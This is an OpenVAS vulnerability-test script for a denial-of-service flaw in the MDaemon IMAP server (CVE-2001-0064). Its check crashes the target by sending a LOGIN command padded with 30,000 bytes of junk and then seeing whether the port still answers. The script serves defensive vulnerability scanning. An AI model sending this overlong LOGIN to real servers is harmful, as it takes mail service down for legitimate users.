# OpenVAS Vulnerability Test
# $Id: mdaemon_imap_server_dos.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: MDaemon imap server DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this softare sending a long
argument to the 'LOGIN' command.

This problem allows an attacker to make the remote service crash, thus 
preventing legitimate users from receiving e-mails.";

tag_solution = "Upgrade to the newest version of this software";

#  Ref: Peter <peter.grundl@defcom.com>

if(description)
{
 script_id(14826);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2134);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2001-0064");
 
 name = "MDaemon imap server DoS";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/imap", 143);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    s = string("? LOGIN ", acct, " ", pass, " ", crap(30000), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
    close(soc);
  
    soc2 = open_sock_tcp(port);
    if(!soc2)security_message(port);
    else close(soc2);
 }
}
